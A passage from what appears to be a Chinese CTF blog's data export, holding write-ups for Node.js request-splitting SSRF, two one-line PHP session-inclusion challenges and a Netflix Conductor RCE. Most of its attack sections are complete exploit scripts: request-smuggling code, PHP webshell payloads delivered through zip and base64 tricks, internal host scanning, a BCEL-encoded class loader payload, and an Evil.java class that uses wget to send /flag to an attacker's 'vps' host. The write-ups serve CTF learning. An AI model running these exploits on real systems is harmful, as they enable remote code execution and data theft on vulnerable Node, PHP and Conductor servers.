/proxy路由可以代理请求，通过它实现SSRF，实际上是发出了http.get()请求，Nodejs8的http库是有漏洞的 认证的时候需要满足req.session.username !== &#39;admin&#39;，拿flag的时候需要满足req.session.username == &#39;admin&#39;, 可以传入[&quot;admin&quot;] 绕过这个限制，然后通过proxy代理发起请求，进行验证 0x02 拆分攻击看样子这里只能向/verify发起本地get请求，但认证需要POST一个token，源码第一行给了node版本，明显这里是要走私POST请求 exp: 12345678910111213141516171819202122232425262728293031323334353637383940#coding=utf-8import requestsurl = &#x27;http://aae0dc25-d3e2-4da7-8f28-6065d1bcf957.node4.buuoj.cn&#x27;#注册用户data = &#x27;&#x27;&#x27;&#123;&quot;username&quot;:[&quot;admin&quot;]&#125;&#x27;&#x27;&#x27;headers = &#123;&quot;Content-Type&quot;:&quot;application/json; charset=utf-8&quot;&#125;r = requests.post(url+&#x27;/register&#x27;, data=data, headers=headers)if &#x27;successfully!&#x27; in r.text: print(&quot;[*]register successfully!&quot;)cookies = requests.utils.dict_from_cookiejar(r.cookies)#验证payload = &quot;&quot;&quot; HTTP/1.1Host: 127.0.0.1:3000POST /verify HTTP/1.1Host: 127.0.0.1:3000Content-Length: &#123;&#125;Content-Type: application/x-www-form-urlencodedCookie: session=&#123;&#125;&#123;&#125;GET /&quot;&quot;&quot;.replace(&#x27;\\n&#x27;, &#x27;\\r\\n&#x27;)body = &quot;token=you_will_never_know&quot;payload = payload.format(len(body), cookies[&#x27;session&#x27;], body)#print(payload)payload = &#x27;&#x27;.join(chr(int(&#x27;0xff&#x27; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)#print(payload)r = requests.get(url+&#x27;/proxy&#x27;, params=&#123;&#x27;url&#x27;:&#x27;http://127.0.0.1:3000/&#x27;+payload&#125;)print(&quot;[*]verify successfully!&quot;)#getFlagprint(requests.get(url+&#x27;/flag&#x27;,cookies=cookies).text)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"Nodejs","slug":"CTF/Nodejs","permalink":"https://123-prog.github.io/categories/CTF/Nodejs/"}],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"https://123-prog.github.io/tags/SSRF/"},{"name":"Node 8.12.0的拆分请求攻击（走私）","slug":"Node-8-12-0的拆分请求攻击（走私）","permalink":"https://123-prog.github.io/tags/Node-8-12-0%E7%9A%84%E6%8B%86%E5%88%86%E8%AF%B7%E6%B1%82%E6%94%BB%E5%87%BB%EF%BC%88%E8%B5%B0%E7%A7%81%EF%BC%89/"}]},{"title":"TCTF-0CTF 1linephp","slug":"TCTF-0CTF-1linephp","date":"2021-07-18T15:35:46.000Z","updated":"2021-09-22T10:14:10.812Z","comments":true,"path":"2021/07/18/TCTF-0CTF-1linephp/","link":"","permalink":"https://123-prog.github.io/2021/07/18/TCTF-0CTF-1linephp/","excerpt":"0x01源码 12&lt;?php($_=@$_GET[&#x27;yxxx&#x27;].&#x27;.php&#x27;) &amp;&amp; @substr(file($_)[0],0,6) === &#x27;@&lt;?php&#x27; ? include($_) : highlight_file(__FILE__) &amp;&amp; include(&#x27;phpinfo.html&#x27;);","text":"0x01源码 12&lt;?php($_=@$_GET[&#x27;yxxx&#x27;].&#x27;.php&#x27;) &amp;&amp; @substr(file($_)[0],0,6) === &#x27;@&lt;?php&#x27; ? include($_) : highlight_file(__FILE__) &amp;&amp; include(&#x27;phpinfo.html&#x27;); 需要满足文件后缀为php，文件内容开头为@&lt;?php 上传文件，post PHP_SESSION_UPLOAD_PROGRESS变量，向session文件中插入payload zip://伪协议包含session文件 0x02 zip文件结构zip文件可以看作三部分组成 压缩源文件数据区（包括文件头，文件数据，数据描述符等等，每个文件都有这么一份空间） 核心目录 目录结束标志 一个例子：shell.zip(包含一个文件，shell.php) 1234567891011121314151600000000 50 4b 03 04 0a 00 00 00 00 00 45 bc f2 52 19 fa |PK........E..R..|00000010 6f fc 41 00 00 00 41 00 00 00 09 00 1c 00 73 68 |o.A...A.......sh|00000020 65 6c 6c 2e 70 68 70 55 54 09 00 03 f2 49 f4 60 |ell.phpUT....I.&#96;|00000030 8c 48 f4 60 75 78 0b 00 01 04 e8 03 00 00 04 e8 |.H.&#96;ux..........|00000040 03 00 00 40 3c 3f 70 68 70 0a 65 63 68 6f 20 22 |...@&lt;?php.echo &quot;|00000050 6e 61 70 70 69 6e 67 43 34 74 20 79 6f 75 20 67 |nappingC4t you g|00000060 6f 74 20 69 74 21 22 2e 27 3c 62 72 3e 27 3b 0a |ot it!&quot;.&#39;&lt;br&gt;&#39;;.|00000070 73 79 73 74 65 6d 28 27 77 68 6f 61 6d 69 27 29 |system(&#39;whoami&#39;)|00000080 3b 3f 3e 0a 50 4b 01 02 1e 03 0a 00 00 00 00 00 |;?&gt;.PK..........|00000090 45 bc f2 52 19 fa 6f fc 41 00 00 00 41 00 00 00 |E..R..o.A...A...|000000a0 09 00 18 00 00 00 00 00 01 00 00 00 a4 81 00 00 |................|000000b0 00 00 73 68 65 6c 6c 2e 70 68 70 55 54 05 00 03 |..shell.phpUT...|000000c0 f2 49 f4 60 75 78 0b 00 01 04 e8 03 00 00 04 e8 |.I.&#96;ux..........|000000d0 03 00 00 50 4b 05 06 00 00 00 00 01 00 01 00 4f |...PK..........O|000000e0 00 00 00 84 00 00 00 00 00 |.........|000000e9 首先看源文件数据区，即从文件头标识（0x04034b50）到核心目录文件头（0x02014b50)的部分 12345678900000000 50 4b 03 04 0a 00 00 00 00 00 45 bc f2 52 19 fa |PK........E..R..|00000010 6f fc 41 00 00 00 41 00 00 00 09 00 1c 00 73 68 |o.A...A.......sh|00000020 65 6c 6c 2e 70 68 70 55 54 09 00 03 f2 49 f4 60 |ell.phpUT....I.&#96;|00000030 8c 48 f4 60 75 78 0b 00 01 04 e8 03 00 00 04 e8 |.H.&#96;ux..........|00000040 03 00 00 40 3c 3f 70 68 70 0a 65 63 68 6f 20 22 |...@&lt;?php.echo &quot;|00000050 6e 61 70 70 69 6e 67 43 34 74 20 79 6f 75 20 67 |nappingC4t you g|00000060 6f 74 20 69 74 21 22 2e 27 3c 62 72 3e 27 3b 0a |ot it!&quot;.&#39;&lt;br&gt;&#39;;.|00000070 73 79 73 74 65 6d 28 27 77 68 6f 61 6d 69 27 29 |system(&#39;whoami&#39;)|00000080 3b 3f 3e 0a |;?&gt;. 其中包含了文件头，文件数据，数据描述符（这里没有） 文件头的结构如下： 文件数据部分记录了压缩文件中的数据，示例zip包中没有数据描述符，用于标识文件压缩结束，磁盘上的zip文件通常没有这个部分 第二部分看核心目录区，由核心目录文件头（0x02014b50)到核心目录结束标志（0x06054b50） 12345600000080 50 4b 01 02 1e 03 0a 00 00 00 00 00 | PK..........|00000090 45 bc f2 52 19 fa 6f fc 41 00 00 00 41 00 00 00 |E..R..o.A...A...|000000a0 09 00 18 00 00 00 00 00 01 00 00 00 a4 81 00 00 |................|000000b0 00 00 73 68 65 6c 6c 2e 70 68 70 55 54 05 00 03 |..shell.phpUT...|000000c0 f2 49 f4 60 75 78 0b 00 01 04 e8 03 00 00 04 e8 |.I.&#96;ux..........|000000d0 03 00 00 |... 第三部分就是End of central directory record(EOCD) 目录结束标识 12000000d0 50 4b 05 06 00 00 00 00 01 00 01 00 4f | PK..........O|000000e0 00 00 00 84 00 00 00 00 00 |.........| 0x03 非预期解题目的思路无非就是通过PHP_SESSION_UPLOAD_PROGRESS变量构造一个ZIP包，但是写进session的时候，变量前面会有一个前缀，看配置知道是upload_progress_，所以现在问题是，如何在这个前缀存在的情况下，使得我们的zip读取不会出问题 非预期解原理是，zip的前26个字节（直到长度位部分）的改动是不会影响我们zip://协议对文件的读取，所以解法是，upload_progress_长度为16，删除zip包开头相等长度部分，将剩余部分作为PHP_SESSION_UPLOAD_PROGRESS变量的值传入，再用zip协议读取 exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8import requestsimport ioimport osimport threadingimport syspoc = &#x27;&#x27;&#x27;@&lt;?phpecho &quot;nappingC4t&quot;;system(&#x27;whoami&#x27;);?&gt;&#x27;&#x27;&#x27;f = open(&#x27;./shell.php&#x27;,&#x27;w&#x27;)f.write(poc)f.close()os.system(&#x27;rm -rf ./shell.zip;zip shell.zip shell.php&#x27;)f = open(&#x27;./shell.zip&#x27;,&#x27;rb&#x27;)ZipContent = f.read()f.close()#print(ZipContent)def get_payload(prefix): offset = len(prefix) return ZipContent[offset:] #截断前面部分字节 prefix = b&#x27;upload_progress_&#x27;payload = get_payload(prefix)#print(payload)url = &#x27;http://127.0.0.1/1.php&#x27;def write(session): while True: f = io.BytesIO(b&#x27;a&#x27;*1024*1024) r = session.post(url, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:payload&#125;, files=&#123;&#x27;file&#x27;:(&#x27;1.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;:&#x27;C4t&#x27;&#125;)def read(session): while True: url = &#x27;http://127.0.0.1/1.php?yxxx=zip:///tmp/sess_C4t&#x27;+&#x27;%23&#x27;+&#x27;shell&#x27; r = session.post(url,data=&#123;&#125;) if &#x27;nappingC4t&#x27; in r.text: print(r.text) event.clear() sys.exit()event = threading.Event()with requests.session() as session: threading.Thread(target=write,args=(session,)).start() threading.Thread(target=read,args=(session,)).start()event.set() 0x04 预期解构造畸形zip: 更改核心目录的42到46位（本地文件头的偏移），和更改目录结束标志的16到20位（核心目录开始位置相对于archive的位移），加上upload_progress_的长度即可 这样读取的时候就可以无视前缀了 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#encoding:utf-8import ioimport osimport threadingimport sysfrom pwn import *poc = &#x27;&#x27;&#x27;@&lt;?phpecho &quot;nappingC4t&quot;;system(&#x27;whoami&#x27;);?&gt;&#x27;&#x27;&#x27;f = open(&#x27;shell.php&#x27;,&#x27;w&#x27;)f.write(poc)f.close()os.system(&#x27;rm -rf ./shell.zip;zip shell.zip shell.php&#x27;)f = open(&#x27;shell.zip&#x27;,&#x27;rb&#x27;)ZipContent = f.read()f.close()#print(ZipContent)central_directory_idx = ZipContent.index(b&#x27;\\x50\\x4b\\x01\\x02&#x27;)end_of_central_directory_idx = ZipContent.index(b&#x27;\\x50\\x4b\\x05\\x06&#x27;)#local file header + file data + data descriptorlfd = ZipContent[:central_directory_idx]#核心目录central_directory = ZipContent[central_directory_idx:end_of_central_directory_idx]#结尾end_central_directory = ZipContent[end_of_central_directory_idx:]def get_payload(offset): header_offset = u32(central_directory[42:46]) archive_offset = u32(end_central_directory[16:20]) return lfd + central_directory[:42] + p32(header_offset+offset) + central_directory[46:] + end_central_directory[:16] + p32(archive_offset+offset) + end_central_directory[20:]prefix = &#x27;upload_progress_&#x27;payload = get_payload(len(prefix))url = &#x27;http://127.0.0.1/1.php&#x27;sessid = &#x27;c4t&#x27;def write(session): f = io.BytesIO(b&#x27;a&#x27;*1024*1024) session.post(url, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:payload&#125;, files=&#123;&#x27;file&#x27;:(&#x27;1.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;:sessid&#125;)def read(session): r = session.post(url=&#x27;http://127.0.0.1/1.php?yxxx=zip:///tmp/sess_&#x27;+sessid+&#x27;%23&#x27;+&#x27;shell&#x27;, data=&#123;&#125;) if &#x27;nappingC4t&#x27; in r.text: print(r.text) event.clear() sys.exit(0)event = threading.Event()with requests.session() as session: threading.Thread(target=write, args=(session,)).start() threading.Thread(target=read, args=(session,)).start()event.set() 0x05 hitcon2018 One Line PHP Challenge题目也是一句话 12&lt;?php ($_=@$_GET[&#x27;orange&#x27;]) &amp;&amp; @substr(file($_)[0],0,6) === &#x27;@&lt;?php&#x27; ? include($_) : highlight_file(__FILE__); 与上面不同的地方，就是没有限定包含文件的后缀，只限定了内容 这里没有phpinfo，无法通过包含上传文件的临时文件拿到shell，上面那题phpinfo是写死的，也不能 这题还是包含session文件，解决前缀的问题是通过base64多次解密消除前缀 原理是，对于不在base64编码字符集内的字符，解码的时候会忽略，所以，多次解密后可能会得到解密结果为空的情况，利用这一特点，结合php://协议对从session文件通过多次解密读出来就可以消除前缀对我们的影响了 需要注意的问题所在： 1.bas64解密是以4个字符一组，所以我们需要构造一个前缀（构造的方式就是在原来前缀后添加随机的字符），满足： 有限次解密之后为空 每次解密得到的结果中有效字符（在字符集中的字符）必须是4的整数，防止不够4个一组影响我们后面的真正的payload部分 解码过程中不能出现=，对于base64来说，等号只会出现在最后面，在中间出现会让接下来的解码出错 2.我们的payload，即脚本中的poc部分，需要进行指定次数的base64-encode，这个encode的过程也不能出现=，在session文件中，我们构造的部分数据是处于中间位置，中间位置就不能出现=，如何让=不出现，很简单，只要满足这样的条件： 因为加密过程是3个字符一组，加密后3个字符会变成4个字符，=的出现是加密字符串长度不是3的倍数，我们只要构造长度为3的倍数即可，加密n次的话，就构造长度为3^n的倍数，在原本的payload后添加任意字符即可 3.可能在解密过程中session文件后面部份，并不是全部可控的部分，可能会出现=，会导致解码失败，这种情况尝试更改我们上传文件的参数，比如文件名，文件长度之类的。多试几遍 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#coding=utf-8import ioimport requestsimport base64import randomimport sysimport threadingprefix = &#x27;upload_progress_&#x27;alphabet = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;def valid_for_b64(str): len = 0 for i in str: if &#x27;%s&#x27; %i in alphabet: len += 1 return lendef test(str): temp_str = str t = 0 while (valid_for_b64(temp_str))%4 == 0 and len(temp_str) !=0: try: temp_str = base64.b64decode(temp_str) t += 1 except Exception as e: #print(e) return False if b&#x27;=&#x27; in temp_str: return False if len(temp_str) == 0: return (True,t) else: return Falsedef get_payload(str): ext_num = 4-(valid_for_b64(str)%4) while True: temp_str = str for i in range(ext_num): temp_str = temp_str + random.choice(alphabet) result=test(temp_str) if result != False: return (temp_str,result[1]) else: continueresult = get_payload(prefix)new_prefix = result[0]decode_times = result[1]print(&quot;[*]需要decode的次数：%i&quot;%decode_times)poc = b&#x27;&#x27;&#x27;@&lt;?phpecho &quot;nappingC4t&quot;;system(&#x27;whoami&#x27;);?&gt;&#x27;&#x27;&#x27;def get_b64_poc(poc): poc_ext = 3**decode_times-(len(poc)%(3**decode_times)) poc = poc + b&#x27;a&#x27;*poc_ext for i in range(decode_times): poc = base64.b64encode(poc) return pocpoc = get_b64_poc(poc)payload = new_prefix[-2:] + str(poc, encoding=&#x27;utf8&#x27;)print(&quot;[*]PHP_SESSION_UPLOAD_PROGRESS：%s&quot;% payload)def write(session): url = &#x27;http://127.0.0.1/1.php&#x27; f = io.BytesIO(b&#x27;b&#x27;*1024*100) while True: session.post(url, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:payload&#125;, files=&#123;&#x27;file&#x27;:(&#x27;ccc.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;:&#x27;c4t&#x27;&#125;)def read(session): url = &#x27;http://127.0.0.1/1.php?orange=php://filter/&#x27;+&#x27;convert.base64-decode|&#x27;*(decode_times-1)+&#x27;convert.base64-decode/resource=/tmp/sess_c4t&#x27; while True: r = session.post(url,data=&#123;&#125;) if &#x27;nappingC4t&#x27; in r.text: print(r.text) event.clear() sys.exit(0)event = threading.Event()with requests.session() as session: threading.Thread(target=write, args=(session,)).start() threading.Thread(target=read, args=(session,)).start()event.set()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php代码审计","slug":"CTF/php代码审计","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"zip伪协议","slug":"zip伪协议","permalink":"https://123-prog.github.io/tags/zip%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"包含session文件getshell","slug":"包含session文件getshell","permalink":"https://123-prog.github.io/tags/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6getshell/"},{"name":"畸形zip","slug":"畸形zip","permalink":"https://123-prog.github.io/tags/%E7%95%B8%E5%BD%A2zip/"}]},{"title":"虎符CTF 2021 Internal System","slug":"虎符CTF-2021-Internal-System","date":"2021-07-14T04:10:59.000Z","updated":"2021-09-22T09:52:43.787Z","comments":true,"path":"2021/07/14/虎符CTF-2021-Internal-System/","link":"","permalink":"https://123-prog.github.io/2021/07/14/%E8%99%8E%E7%AC%A6CTF-2021-Internal-System/","excerpt":"0x01 NodeJS代码审计/source","text":"0x01 NodeJS代码审计/source 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149const express = require(&#x27;express&#x27;)const router = express.Router()const axios = require(&#x27;axios&#x27;)const isIp = require(&#x27;is-ip&#x27;)const IP = require(&#x27;ip&#x27;)const UrlParse = require(&#x27;url-parse&#x27;)const &#123;sha256, hint&#125; = require(&#x27;./utils&#x27;)const salt = &#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;const adminHash = sha256(sha256(salt + &#x27;admin&#x27;) + sha256(salt + &#x27;admin&#x27;))const port = process.env.PORT || 3000function formatResopnse(response) &#123; if(typeof(response) !== typeof(&#x27;&#x27;)) &#123; return JSON.stringify(response) &#125; else &#123; return response &#125;&#125;function SSRF_WAF(url) &#123; const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, &#x27;&#x27;) return isIp(host) &amp;&amp; IP.isPublic(host)&#125;function FLAG_WAF(url) &#123; const pathname = new UrlParse(url).pathname return !pathname.startsWith(&#x27;/flag&#x27;)&#125;function OTHER_WAF(url) &#123; return true;&#125;const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]router.get(&#x27;/&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/login&#x27;, (req, res, next) =&gt; &#123; const &#123;username, password&#125; = req.query; if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; res.render(&#x27;login&#x27;) &#125; else &#123; const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect(&#x27;/index&#x27;) &#125;&#125;)router.get(&#x27;/index&#x27;, (req, res, next) =&gt; &#123; if(req.session.admin === undefined || req.session.admin === null) &#123; res.redirect(&#x27;/login&#x27;) &#125; else &#123; res.render(&#x27;index&#x27;, &#123;admin: req.session.admin, network: JSON.stringify(require(&#x27;os&#x27;).networkInterfaces())&#125;) &#125;&#125;)router.get(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) &#123; res.render(&#x27;base&#x27;, &#123;title: &#x27;WAF&#x27;, content: &quot;Here is the waf...&quot;&#125;) &#125; else &#123; try &#123; const response = await axios.get(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, response.data) &#125; catch(error) &#123; res.render(&#x27;base&#x27;, error.message) &#125; &#125;&#125;)router.post(&#x27;/proxy&#x27;, async(req, res, next) =&gt; &#123; if(!req.session.admin) &#123; return res.redirect(&#x27;/index&#x27;) &#125; // test url // not implemented here const url = &quot;https://postman-echo.com/post&quot; await axios.post(`http://127.0.0.1:$&#123;port&#125;/search?url=$&#123;url&#125;`) res.render(&#x27;base&#x27;, &quot;Something needs to be implemented&quot;)&#125;)router.all(&#x27;/search&#x27;, async (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;You can only use proxy to aceess here!&#x27;&#125;) &#125; const result = &#123;title: &#x27;Search Success&#x27;, content: &#x27;&#x27;&#125; const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try &#123; if(method == &#x27;get&#x27;) &#123; const response = await axios.get(url) result.content = formatResopnse(response.data) &#125; else if(method == &#x27;post&#x27;) &#123; const response = await axios.post(url, data) result.content = formatResopnse(response.data) &#125; else &#123; result.title = &#x27;Error&#x27; result.content = &#x27;Unsupported Method&#x27; &#125; &#125; catch(error) &#123; result.title = &#x27;Error&#x27; result.content = error.message &#125; return res.json(result)&#125;)router.get(&#x27;/source&#x27;, (req, res, next)=&gt;&#123; res.sendFile( __dirname + &quot;/&quot; + &quot;index.js&quot;);&#125;)router.get(&#x27;/flag&#x27;, (req, res, next) =&gt; &#123; if(!/127\\.0\\.0\\.1/.test(req.ip))&#123; return res.send(&#123;title: &#x27;Error&#x27;, content: &#x27;No Flag For You!&#x27;&#125;) &#125; return res.json(&#123;hint: hint&#125;)&#125;)module.exports = router 第一步，以admin身份登录，其验证的方法是 12345678910111213router.get(&#x27;/login&#x27;, (req, res, next) =&gt; &#123; const &#123;username, password&#125; = req.query; if(!username || !password || username === password || username.length === password.length || username === &#x27;admin&#x27;) &#123; res.render(&#x27;login&#x27;) &#125; else &#123; const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect(&#x27;/index&#x27;) &#125;&#125;) adminHash定义为 1const adminHash = sha256(sha256(salt + &#x27;admin&#x27;) + sha256(salt + &#x27;admin&#x27;)) 在满足条件!username || !password || username === password || username.length === password.length || username === &#39;admin&#39;的情况下，可以利用数组和字符串可拼接的特点，如 绕过payload: 1&#x2F;login?username[]&#x3D;admin&amp;password&#x3D;admin 跳转到/index 0x02审查源码，在路由/flag下存在一个hint，所以接下来目标是访问到/flag 路由/search,/flag都只能本地访问，/proxy是一个代理访问，可以做SSRF的利用 但是/proxy下存在过滤 1234567891011121314function SSRF_WAF(url) &#123; const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, &#x27;&#x27;) return isIp(host) &amp;&amp; IP.isPublic(host)&#125;function FLAG_WAF(url) &#123; const pathname = new UrlParse(url).pathname return !pathname.startsWith(&#x27;/flag&#x27;)&#125;function OTHER_WAF(url) &#123; return true;&#125; SSRF_WAF可以用0.0.0.0绕过，FLAG_WAF形同虚设，大写绕过，或者访问到/search，通过/search访问/flag 12&#x2F;proxy?url&#x3D;http:&#x2F;&#x2F;0.0.0.0:3000&#x2F;Flag 或&#x2F;proxy?url&#x3D;http:&#x2F;&#x2F;0.0.0.0:3000&#x2F;search?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:3000&#x2F;flag 得到提示 在内网的其他主机上运行着Netflix Conductor服务，那接下来就肯定打这个服务了 0x03前面登录成功的时候是已经给了当前主机的网络信息，Netflix Conductor服务端口号是8080，爆破一下子网内的主机 1&#x2F;proxy?url&#x3D;http:&#x2F;&#x2F;0.0.0.0:3000&#x2F;search?url&#x3D;http:&#x2F;&#x2F;10.0.85.x:8080 在10.0.85.9主机上 是个swagger UI ,api接口文档 通过访问/api/swagger.json可以得到接口的列表 方便查看，可以在本地搭一个swagger UI（https://petstore.swagger.io/） ,导入上面拿到的接口列表 接口/api/admin/config查看版本为2.26.0 漏洞利用 CVE-2020-9296-Netflix-Conductor-RCE https://xz.aliyun.com/t/7889#toc-3 cve记录的版本号是到2.25.0，但这里也可以用 漏洞利用很简单，在/api/metadata/taskdefs，POST一个json，在json中插入恶意BCEL编码，就可以实现RCE 1234567891011121314151617181920212223curl -X POST \\ http:&#x2F;&#x2F;localhost:8080&#x2F;api&#x2F;metadata&#x2F;taskdefs \\ -H &#39;Content-Type: application&#x2F;json&#39; \\ -d &#39;[ &#123; &quot;name&quot;: &quot;$&#123;&#39;1&#39;.getClass().forName(&#39;com.sun.org.apache.bcel.internal.util.ClassLoader&#39;).newInstance().loadClass(&#39;BCEL&#39;).newInstance().class&#125;&quot;, &#x2F;&#x2F;利用点在name这里,com.sun.org.apache.bcel.internal.util.ClassLoader加载class通过BCEL &quot;retryCount&quot;: 3, &quot;retryLogic&quot;: &quot;FIXED&quot;, &quot;retryDelaySeconds&quot;: 10, &quot;timeoutSeconds&quot;: 300, &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;, &quot;responseTimeoutSeconds&quot;: 180 &#125;, &#123; &quot;name&quot;: &quot;add_idents&quot;, &quot;retryCount&quot;: 3, &quot;retryLogic&quot;: &quot;FIXED&quot;, &quot;retryDelaySeconds&quot;: 10, &quot;timeoutSeconds&quot;: 300, &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;, &quot;responseTimeoutSeconds&quot;: 180 &#125;]&#39; 0x04准备一个恶意类 Evil.java 12345678910111213public class Evil&#123; public Evil()&#123; try&#123; String[] command &#x3D; &#123; &quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, &quot;wget http:&#x2F;&#x2F;vps:port?a&#x3D;&#96;cat &#x2F;flag&#96;&quot;&#125;; Runtime.getRuntime().exec(command); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(final String[]array)&#123; &#125;&#125; 使用javac Evil.java编译生成Evil.class 使用这个工具GitHub - f1tz/BCELCodeman: BCEL encode/decode manager for fastjson payloads 将class文件转码成BCEL编码 所以我们利用漏洞需要的POST请求为 12345POST &#x2F;api&#x2F;metadata&#x2F;taskdefs HTTP&#x2F;1.1Host: 10.0.85.9:8080Content-Type: application&#x2F;json[&#123;&quot;name&quot;: &quot;$&#123;&#39;1&#39;.getClass().forName(&#39;com.sun.org.apache.bcel.internal.util.ClassLoader&#39;).newInstance().loadClass(&#39;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbR$gA$U$3d$3d$e0$M$OCx$J$J$e6$F$ba$Q$b4$8a$B$rI$V$e4$b1H$99$V$89$v$b1t$e1$86fl$b1$R$Gjh$d4$85$ff$93$b5$h$92r$e1$H$e4$a3$a2$b7$tU$nUIW$f5$e9$be$e7$9e$3e$f7v$f7$cf_$b7w$A$gX$b7$R$c3$8a$8d$i$f21$3c$d6$eb$T$L$F$hKX$b5$f0$d4$c23$G$f3$ad$f4$a5z$cf$Q$vW$O$Z$a2$l$c7$t$82$n$d9$96$be$f82$h$f5Dp$c0$7bCb$S$j$c5$bd$f3$cf$7c$S$c6$e1$e9$C$c9G$5c$fa$M$f9$f2q$7b$c0$_$b8$3b$e4$7e$df$ed$a8$40$fa$fd$96$b6$b3$3b$e3Y$e0$89OR$5b$y$ef$5e$c8aU$eb$i$y$c3$b6$f0$dc$c1$L$bcd$d8$b9$ec$LU$3cSj$d2t$dd$fav$bd$ba$f3$a6Z$afU$b7_5$9a$f5Z$ad$f6$81$bf$ebz$5c$V$dd$d3$n$ef_$f7$f8T$bcnt$j$UQb$c8$$$ca$ee$5eyb$a2$e4$d8w$b0$G$9bz$d3$e5$YR$L$c5$5eo$m$3c$c5$90$5eP$fb3_$c9$R5gS$L$7f$82$5c$b9$d2$feG$d3$oKq$r$3c$86$8d$f2$7fn$fb$X$f55$Y$7bb$3a$a5$D$c9$J$rU$f8t$H$B$f7$EJ$b0$e8K$f40$c0$f4$x$Q$c6$v$eaRl$d0$9a$df$fc$O$f6$DF$s2G$f4$e8$hb$ed$ad9$cc$hRE$91$40$8a$7e$ce$80C$baU$98$84$Rb$97$88$8fQ$c6D$9a$bcs$e4$99$a0L$K$c6$3d$B$b3$f0HC2J$7c$8a$U$bf$ab$Vh2$3do$c2$8d64C$oN$98$J$9b$cb$3e$A$83P$ba$98E$C$A$A&#39;).newInstance().class&#125;&quot;,&quot;retryCount&quot;: 3,&quot;retryLogic&quot;: &quot;FIXED&quot;,&quot;retryDelaySeconds&quot;:10, &quot;timeoutSeconds&quot;: 300,&quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;,&quot;responseTimeoutSeconds&quot;: 180&#125;,&#123;&quot;name&quot;: &quot;add_idents&quot;,&quot;retryCount&quot;: 3,&quot;retryLogic&quot;: &quot;FIXED&quot;,&quot;retryDelaySeconds&quot;: 10,&quot;timeoutSeconds&quot;: 300, &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;,&quot;responseTimeoutSeconds&quot;: 180&#125;] 但我们现在看起来只能利用/search向10.0.85.9/api/metadata/taskdefs发起get请求，虽然/search中可以发起POST请求，但是因为实际上我们是通过/proxy访问到/search，我们无法直接访问/search,导致我们无法向/searchPOST数据，这里可以通过拆分攻击，前面已经有提示，就是salt的值，可以得知NodeJS版本是8，这个版本，http库有漏洞，我们完全可以实现在get请求中走私一个POST请求达到目的 具体怎么走私，看例子 在毫无防范的情况下，可以通过在请求中注入协议控制字符，比如\\r\\n，文本协议是脆弱的，当注入的协议控制符可以生效，那么我们就可以完全控制这个请求，比如提前给出请求的结束标志，在结束后附加另一个请求（比如一个POST请求），就实现了附加请求，也正是我们现在需要完成的 12GET &#x2F;index.php?a&#x3D;1 HTTP&#x2F;1.1... 请求?a=1 HTTP/1.1\\r\\n\\r\\nPOST /index.php HTTP/1.1\\r\\nContent-Length:10\\r\\nContent-Type:application/json\\r\\n\\r\\n xxxxxxxxxx 然后请求就变成了 1234567GET &#x2F;index.php?a&#x3D;1 HTTP&#x2F;1.1POST &#x2F;index.php HTTP&#x2F;1.1Content-Length:10Content-Type:application&#x2F;textxxxxxxxxxx 但通常的http库会阻止这样的行为，Node.js当然也会阻止，当你的请求路径存在协议控制字符，会自动进行url编码，使其失去作用 